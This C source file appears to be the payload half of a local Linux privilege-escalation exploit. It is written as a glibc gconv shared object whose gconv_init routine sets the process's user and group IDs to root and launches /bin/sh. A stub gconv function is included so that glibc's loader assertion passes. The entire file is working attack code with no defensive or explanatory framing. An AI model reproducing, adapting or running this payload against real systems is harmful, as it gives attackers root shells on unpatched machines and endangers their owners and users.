#include <gconv.h>
#include <unistd.h>
#include <stdio.h>

/* This function is executed as root */
void payload()
{
    char *argv[] = {"/bin/sh", NULL};
    uid_t uid;

    uid = getuid();
    fprintf(stderr, "After exploit, your UID is %d\n", uid);
    fprintf(stderr, "Running shell:\n\n");
    execv(argv[0], argv);
}

/* Called upon shared object loading by glibc. */
int gconv_init (struct __gconv_step *step)
{
    /* Run this process and subprocesses as root */
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);

    /* Execute payload */
    payload();

    return __GCONV_OK;
}

/*
 * glibc checks for this function when loading the shared object. It
 * is never called, but if it does not exist, an assertion fails.
 */
int gconv(struct __gconv_step *step)
{
    return __GCONV_OK;
}
